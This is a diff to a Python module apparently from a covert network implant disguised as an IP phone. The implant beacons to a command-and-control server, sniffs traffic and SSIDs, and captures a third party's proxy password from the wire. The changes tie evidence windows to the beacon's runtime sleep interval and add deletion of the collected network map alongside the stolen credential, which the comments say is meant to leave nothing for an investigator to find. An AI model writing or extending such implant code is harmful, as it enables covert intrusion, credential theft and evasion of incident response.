@@ -74,6 +74,14 @@ _SCAN_EVERY = 300
 _WINDOW_STALE_AFTER = 3600
 # How many of the beacon's own cycles a window may go unwritten for.
 _WINDOW_STALE_CYCLES = 12
+# And the longest cycle this process will believe a window's own numbers
+# about. The beacon's interval has no upper bound, but a window whose
+# numbers imply a cycle longer than a day does not describe a beacon this
+# process can usefully serve -- the design's worst case for an outage is a
+# week, which is seven of those -- and believing it would leave an
+# IP-phone-shaped device capturing and scanning the radio for ever on the
+# strength of one field in one file.
+_MAX_CYCLE_SECONDS = 86400
 
 
 def _parse_scan(output: str) -> List[dict]:
@@ -188,27 +196,46 @@ class Scout(object):
         touched = state.get("touched")
         if not isinstance(touched, (int, float)) or isinstance(touched, bool):
             return True
-        return abs(time.time() - float(touched)) <= self._window_ceiling()
+        return abs(time.time() - float(touched)) <= self._window_ceiling(state)
 
-    def _window_ceiling(self) -> float:
+    def _window_ceiling(self, state: dict) -> float:
         """How long a window may go unwritten before this process drops it.
 
         Twelve of the **beacon's own cycles**, floored at an hour.
         `beacon_interval_seconds` is the operator's and has no upper
         bound -- `_way_out_points` reasons carefully about exactly that
         control on the other side of the handoff, and this side used a
-        fixed hour. At `beacon_interval_seconds: 7200` every live window
-        read as dead for most of every cycle, so the scout dropped its
-        evidence and deleted its captured credential on each poll and
-        rungs 2 to 4 had nothing left to act on.
+        fixed hour. At a two-hour interval every live window read as dead
+        for most of every cycle, so the scout dropped its evidence and
+        deleted its captured credential on each poll, and rungs 2 to 4
+        had nothing left to act on.
+
+        **Read from the window itself, not from the config file.** The
+        beacon's interval is re-set at runtime by the `sleep` task verb
+        and by `reconfig`'s `sleeptime`, so the yaml is only what it
+        started with -- and the window carries the live number already:
+        `hours_dark` is `stuck_cycles * interval / 3600`, so the two of
+        them say what a cycle currently costs. The config is the fallback
+        for a window that does not carry both.
         """
+        return max(float(_WINDOW_STALE_AFTER),
+                   _WINDOW_STALE_CYCLES * self._cycle_seconds(state))
+
+    def _cycle_seconds(self, state: dict) -> float:
+        """How long one of the beacon's cycles currently takes."""
+        cycles = state.get("stuck_cycles")
+        hours = state.get("hours_dark")
+        if (isinstance(cycles, int) and not isinstance(cycles, bool)
+                and cycles > 0
+                and isinstance(hours, (int, float))
+                and not isinstance(hours, bool) and hours > 0):
+            return min(float(_MAX_CYCLE_SECONDS),
+                       (float(hours) * 3600.0) / float(cycles))
         raw = _block(self.config, "c2").get("beacon_interval_seconds")
         try:
-            interval = float(raw)
+            return max(0.0, float(raw))
         except (TypeError, ValueError):
-            interval = 0.0
-        return max(float(_WINDOW_STALE_AFTER),
-                   _WINDOW_STALE_CYCLES * interval)
+            return 0.0
 
     def observe(self, packet) -> None:
         """One captured frame. Raises nothing, whatever it is."""
@@ -315,16 +342,26 @@ class Scout(object):
         self._window = opened
 
     def _forget(self) -> None:
-        """Drop this window's evidence and its captured secret.
+        """Drop this window's evidence and the two files that carried it.
 
-        Both halves together, because they are one statement: the next
-        window starts from nothing. The borrow file is **removed** rather
-        than written empty, so there is no file on the disk of a device
-        built to look like an IP phone for somebody to find.
+        One statement in three places: the next window starts from
+        nothing. The borrow file is the one that holds a **secret** -- a
+        third party's proxy password, off the wire -- and the document
+        holds the host's MAC and IP, its proxies and resolvers, its TLS
+        destinations and the SSIDs in range. Both **removed** rather than
+        written empty, so there is nothing on the disk of a device built
+        to look like an IP phone for the next reader, or the next
+        investigator, to find. The beacon does the same with its own
+        window file; between them the handoff leaves only the trail,
+        which is the one artefact this design means to outlive an
+        outage, and `dhclient`'s lease.
+
+        Raises nothing: `handoff.remove` does not.
         """
         self.evidence = Evidence(own_mac=self._own_mac(),
                                  host_macs=self._host_macs())
         handoff.remove(handoff.borrow_path(self.state_dir))
+        handoff.remove(handoff.document_path(self.state_dir))
 
     def _tap_fields(self) -> dict:
         fields = self.evidence.as_document_fields()
